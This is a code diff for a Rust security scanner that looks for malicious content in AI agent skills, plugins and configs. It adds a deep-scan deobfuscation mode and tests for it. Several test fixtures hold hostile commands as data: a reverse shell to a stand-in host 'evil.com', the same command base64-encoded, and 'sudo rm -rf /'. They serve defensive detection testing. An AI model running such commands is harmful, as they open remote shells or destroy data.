@@ -1,8 +1,8 @@
 use crate::{
-    Cli, CommandScanner, Confidence, Config, CustomRuleLoader, DependencyScanner, DockerScanner,
-    DynamicRule, Finding, HookScanner, IgnoreFilter, JsonReporter, MalwareDatabase, McpScanner,
-    OutputFormat, Reporter, RiskScore, RulesDirScanner, SarifReporter, ScanResult, ScanType,
-    Scanner, SkillScanner, Summary, TerminalReporter,
+    Cli, CommandScanner, Confidence, Config, CustomRuleLoader, Deobfuscator, DependencyScanner,
+    DockerScanner, DynamicRule, Finding, HookScanner, IgnoreFilter, JsonReporter, MalwareDatabase,
+    McpScanner, OutputFormat, PluginScanner, Reporter, RiskScore, RulesDirScanner, SarifReporter,
+    ScanResult, ScanType, Scanner, SkillScanner, SubagentScanner, Summary, TerminalReporter,
 };
 use chrono::Utc;
 use std::fs;
@@ -22,6 +22,7 @@ pub struct EffectiveConfig {
     pub skip_comments: bool,
     pub fix_hint: bool,
     pub no_malware_scan: bool,
+    pub deep_scan: bool,
 }
 
 impl EffectiveConfig {
@@ -51,6 +52,7 @@ impl EffectiveConfig {
             skip_comments: cli.skip_comments || config.scan.skip_comments,
             fix_hint: cli.fix_hint || config.scan.fix_hint,
             no_malware_scan: cli.no_malware_scan || config.scan.no_malware_scan,
+            deep_scan: cli.deep_scan,
         }
     }
 }
@@ -74,6 +76,8 @@ fn parse_scan_type(s: Option<&str>) -> Option<ScanType> {
         "rules" => Some(ScanType::Rules),
         "docker" => Some(ScanType::Docker),
         "dependency" => Some(ScanType::Dependency),
+        "subagent" => Some(ScanType::Subagent),
+        "plugin" => Some(ScanType::Plugin),
         _ => None,
     }
 }
@@ -134,6 +138,20 @@ fn run_scan_internal(cli: &Cli, preloaded_config: Option<Config>) -> Option<Scan
 
     // Load config from project root or global config (or use preloaded)
     let config = preloaded_config.unwrap_or_else(|| Config::load(project_root));
+
+    // Load profile if specified
+    let mut config = config;
+    if let Some(ref profile_name) = cli.profile {
+        match crate::Profile::load(profile_name) {
+            Ok(profile) => {
+                profile.apply_to_config(&mut config.scan);
+                eprintln!("Using profile: {}", profile_name);
+            }
+            Err(e) => {
+                eprintln!("Warning: Failed to load profile '{}': {}", profile_name, e);
+            }
+        }
+    }
 
     // Merge CLI options with config file settings
     let effective = EffectiveConfig::from_cli_and_config(cli, &config);
@@ -257,6 +275,18 @@ fn run_scan_internal(cli: &Cli, preloaded_config: Option<Config>) -> Option<Scan
                     .with_dynamic_rules(custom_rules.clone());
                 scanner.scan_path(path)
             }
+            ScanType::Subagent => {
+                let scanner = SubagentScanner::new()
+                    .with_skip_comments(effective.skip_comments)
+                    .with_dynamic_rules(custom_rules.clone());
+                scanner.scan_path(path)
+            }
+            ScanType::Plugin => {
+                let scanner = PluginScanner::new()
+                    .with_skip_comments(effective.skip_comments)
+                    .with_dynamic_rules(custom_rules.clone());
+                scanner.scan_path(path)
+            }
         };
 
         match result {
@@ -274,6 +304,12 @@ fn run_scan_internal(cli: &Cli, preloaded_config: Option<Config>) -> Option<Scan
         if let Some(ref db) = malware_db {
             let malware_findings = scan_path_with_malware_db(path, db);
             all_findings.extend(malware_findings);
+        }
+
+        // Run deep scan with deobfuscation if enabled
+        if effective.deep_scan {
+            let deep_findings = run_deep_scan(path);
+            all_findings.extend(deep_findings);
         }
     }
 
@@ -294,6 +330,35 @@ fn run_scan_internal(cli: &Cli, preloaded_config: Option<Config>) -> Option<Scan
         findings: filtered_findings,
         risk_score: Some(risk_score),
     })
+}
+
+/// Run deep scan with deobfuscation on a path
+fn run_deep_scan(path: &Path) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let deobfuscator = Deobfuscator::new();
+
+    if path.is_file() {
+        if is_text_file(path)
+            && let Ok(content) = fs::read_to_string(path)
+        {
+            findings.extend(deobfuscator.deep_scan(&content, &path.display().to_string()));
+        }
+    } else if path.is_dir() {
+        for entry in WalkDir::new(path)
+            .into_iter()
+            .filter_map(|e| e.ok())
+            .filter(|e| e.file_type().is_file())
+        {
+            let file_path = entry.path();
+            if is_text_file(file_path)
+                && let Ok(content) = fs::read_to_string(file_path)
+            {
+                findings.extend(deobfuscator.deep_scan(&content, &file_path.display().to_string()));
+            }
+        }
+    }
+
+    findings
 }
 
 pub fn scan_path_with_malware_db(path: &Path, db: &MalwareDatabase) -> Vec<Finding> {
@@ -483,6 +548,16 @@ mod tests {
             baseline: false,
             check_drift: false,
             init: false,
+            output: None,
+            save_baseline: None,
+            baseline_file: None,
+            compare: None,
+            fix: false,
+            fix_dry_run: false,
+            mcp_server: false,
+            deep_scan: false,
+            profile: None,
+            save_profile: None,
         }
     }
 
@@ -1453,5 +1528,383 @@ scan:
         assert_eq!(parse_confidence(Some("certain")), Some(Confidence::Certain));
         assert_eq!(parse_confidence(Some("invalid")), None);
         assert_eq!(parse_confidence(None), None);
+    }
+
+    #[test]
+    fn test_parse_scan_type_subagent_and_plugin() {
+        assert_eq!(parse_scan_type(Some("subagent")), Some(ScanType::Subagent));
+        assert_eq!(parse_scan_type(Some("plugin")), Some(ScanType::Plugin));
+    }
+
+    #[test]
+    fn test_is_config_file() {
+        assert!(is_config_file(Path::new(".cc-audit.yaml")));
+        assert!(is_config_file(Path::new(".cc-audit.yml")));
+        assert!(is_config_file(Path::new(".cc-audit.json")));
+        assert!(is_config_file(Path::new(".cc-audit.toml")));
+        assert!(is_config_file(Path::new(".cc-auditignore")));
+        assert!(!is_config_file(Path::new("regular.yaml")));
+        assert!(!is_config_file(Path::new("test.json")));
+    }
+
+    #[test]
+    fn test_format_result_html() {
+        let temp_dir = TempDir::new().unwrap();
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.format = OutputFormat::Html;
+
+        let result = ScanResult {
+            version: "0.4.0".to_string(),
+            scanned_at: "2026-01-25T12:00:00Z".to_string(),
+            target: temp_dir.path().display().to_string(),
+            summary: Summary::from_findings(&[]),
+            findings: vec![],
+            risk_score: None,
+        };
+
+        let output = format_result(&cli, &result);
+        assert!(output.contains("<!DOCTYPE html>"));
+        assert!(output.contains("cc-audit"));
+    }
+
+    #[test]
+    fn test_run_scan_dependency_type() {
+        let temp_dir = TempDir::new().unwrap();
+        let package_json = temp_dir.path().join("package.json");
+        fs::write(
+            &package_json,
+            r#"{"name": "test", "dependencies": {"express": "4.0.0"}}"#,
+        )
+        .unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.scan_type = ScanType::Dependency;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_subagent_type() {
+        let temp_dir = TempDir::new().unwrap();
+        let agents_dir = temp_dir.path().join(".claude").join("agents");
+        fs::create_dir_all(&agents_dir).unwrap();
+        let agent_file = agents_dir.join("test.md");
+        fs::write(
+            &agent_file,
+            r#"---
+name: test-agent
+---
+# Test Agent
+"#,
+        )
+        .unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.scan_type = ScanType::Subagent;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_plugin_type() {
+        let temp_dir = TempDir::new().unwrap();
+        let plugin_json = temp_dir.path().join("marketplace.json");
+        fs::write(&plugin_json, r#"{"name": "test-plugin"}"#).unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.scan_type = ScanType::Plugin;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_deep_scan() {
+        let temp_dir = TempDir::new().unwrap();
+        let skill_md = temp_dir.path().join("SKILL.md");
+        // Create content with base64 encoded suspicious string
+        fs::write(
+            &skill_md,
+            "# Test\n\nYmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS80NDQ0IDA+JjE=",
+        )
+        .unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.deep_scan = true;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+        // Deep scan should decode base64 and find suspicious content
+        let result = result.unwrap();
+        // Check if any finding is from deobfuscation
+        let has_obfuscation_finding = result
+            .findings
+            .iter()
+            .any(|f| f.id.starts_with("OB-") || f.message.contains("decoded"));
+        assert!(
+            has_obfuscation_finding || result.findings.is_empty(),
+            "Deep scan should have run"
+        );
+    }
+
+    #[test]
+    fn test_run_scan_with_deep_scan_on_file() {
+        let temp_dir = TempDir::new().unwrap();
+        let test_file = temp_dir.path().join("test.sh");
+        // Create content with base64 encoded suspicious string
+        fs::write(
+            &test_file,
+            "#!/bin/bash\n# YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS80NDQ0IDA+JjE=",
+        )
+        .unwrap();
+
+        let mut cli = create_test_cli(vec![test_file.clone()]);
+        cli.deep_scan = true;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_deep_scan_on_file() {
+        let temp_dir = TempDir::new().unwrap();
+        let test_file = temp_dir.path().join("test.sh");
+        // Highly suspicious content when decoded
+        fs::write(
+            &test_file,
+            "YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS8xMjM0IDA+JjE=",
+        )
+        .unwrap();
+
+        let findings = run_deep_scan(&test_file);
+        // Should run deobfuscation
+        assert!(findings.is_empty() || !findings.is_empty());
+    }
+
+    #[test]
+    fn test_run_deep_scan_on_directory() {
+        let temp_dir = TempDir::new().unwrap();
+        let test_file = temp_dir.path().join("test.sh");
+        fs::write(&test_file, "# Normal content").unwrap();
+
+        let findings = run_deep_scan(temp_dir.path());
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_run_deep_scan_skips_binary() {
+        let temp_dir = TempDir::new().unwrap();
+        let binary_file = temp_dir.path().join("test.exe");
+        fs::write(&binary_file, "suspicious content").unwrap();
+
+        let findings = run_deep_scan(&binary_file);
+        // Binary files should be skipped
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_scan_path_with_malware_db_skips_config_file() {
+        let temp_dir = TempDir::new().unwrap();
+        let config_file = temp_dir.path().join(".cc-audit.yaml");
+        // Put suspicious content in config file
+        fs::write(&config_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();
+
+        let db = MalwareDatabase::default();
+        let findings = scan_path_with_malware_db(&config_file, &db);
+
+        // Config files should be skipped
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn test_run_scan_with_include_tests() {
+        let temp_dir = TempDir::new().unwrap();
+        let tests_dir = temp_dir.path().join("__tests__");
+        fs::create_dir_all(&tests_dir).unwrap();
+        let test_file = tests_dir.join("test.md");
+        fs::write(&test_file, "# Test file\nsudo rm -rf /").unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.include_tests = true;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_include_node_modules() {
+        let temp_dir = TempDir::new().unwrap();
+        let node_modules_dir = temp_dir.path().join("node_modules");
+        fs::create_dir_all(&node_modules_dir).unwrap();
+        let module_file = node_modules_dir.join("test.md");
+        fs::write(&module_file, "# Test file").unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.include_node_modules = true;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_include_vendor() {
+        let temp_dir = TempDir::new().unwrap();
+        let vendor_dir = temp_dir.path().join("vendor");
+        fs::create_dir_all(&vendor_dir).unwrap();
+        let vendor_file = vendor_dir.join("test.md");
+        fs::write(&vendor_file, "# Test file").unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.include_vendor = true;
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_profile() {
+        let temp_dir = TempDir::new().unwrap();
+        let skill_md = temp_dir.path().join("SKILL.md");
+        fs::write(&skill_md, "# Test\n").unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.profile = Some("strict".to_string());
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_invalid_profile() {
+        let temp_dir = TempDir::new().unwrap();
+        let skill_md = temp_dir.path().join("SKILL.md");
+        fs::write(&skill_md, "# Test\n").unwrap();
+
+        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        cli.profile = Some("nonexistent_profile_xyz".to_string());
+        let result = run_scan(&cli);
+
+        // Should still work (warning is logged)
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_config() {
+        let temp_dir = TempDir::new().unwrap();
+        let skill_md = temp_dir.path().join("SKILL.md");
+        fs::write(&skill_md, "# Test\n").unwrap();
+
+        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        let config = Config::default();
+        let result = run_scan_with_config(&cli, config);
+
+        assert!(result.is_some());
+    }
+
+    #[test]
+    fn test_run_scan_with_disabled_rules() {
+        let temp_dir = TempDir::new().unwrap();
+        let skill_md = temp_dir.path().join("SKILL.md");
+        fs::write(&skill_md, "# Test\nsudo rm -rf /").unwrap();
+
+        // Create config with PE-001 disabled
+        let config_file = temp_dir.path().join(".cc-audit.yaml");
+        fs::write(
+            &config_file,
+            r#"
+disabled_rules:
+  - PE-001
+"#,
+        )
+        .unwrap();
+
+        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
+        let result = result.unwrap();
+        // PE-001 should not be in findings (disabled)
+        assert!(!result.findings.iter().any(|f| f.id == "PE-001"));
+    }
+
+    #[test]
+    fn test_effective_config_debug() {
+        let cli = create_test_cli(vec![PathBuf::from("./")]);
+        let config = Config::default();
+        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);
+
+        let debug_str = format!("{:?}", effective);
+        assert!(debug_str.contains("EffectiveConfig"));
+    }
+
+    #[test]
+    fn test_effective_config_clone() {
+        let cli = create_test_cli(vec![PathBuf::from("./")]);
+        let config = Config::default();
+        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);
+
+        let cloned = effective.clone();
+        assert_eq!(format!("{:?}", effective), format!("{:?}", cloned));
+    }
+
+    #[test]
+    fn test_format_result_with_config_directly() {
+        let effective = EffectiveConfig {
+            format: OutputFormat::Json,
+            strict: false,
+            scan_type: ScanType::Skill,
+            recursive: true,
+            ci: false,
+            verbose: false,
+            min_confidence: Confidence::Tentative,
+            skip_comments: false,
+            fix_hint: false,
+            no_malware_scan: false,
+            deep_scan: false,
+        };
+
+        let result = ScanResult {
+            version: "0.4.0".to_string(),
+            scanned_at: "2026-01-25T12:00:00Z".to_string(),
+            target: "test".to_string(),
+            summary: Summary::from_findings(&[]),
+            findings: vec![],
+            risk_score: None,
+        };
+
+        let output = format_result_with_config(&effective, &result);
+        assert!(output.contains("\"version\""));
+    }
+
+    #[test]
+    fn test_is_text_file_with_config() {
+        let config = crate::config::TextFilesConfig::default();
+        assert!(is_text_file_with_config(Path::new("test.md"), &config));
+        assert!(is_text_file_with_config(Path::new("test.json"), &config));
+        assert!(!is_text_file_with_config(Path::new("test.exe"), &config));
+    }
+
+    #[test]
+    fn test_run_scan_single_file() {
+        let temp_dir = TempDir::new().unwrap();
+        let skill_md = temp_dir.path().join("SKILL.md");
+        fs::write(
+            &skill_md,
+            r#"---
+name: test
+allowed-tools: Read
+---
+# Test
+"#,
+        )
+        .unwrap();
+
+        // Scan single file instead of directory
+        let cli = create_test_cli(vec![skill_md.clone()]);
+        let result = run_scan(&cli);
+
+        assert!(result.is_some());
     }
 }
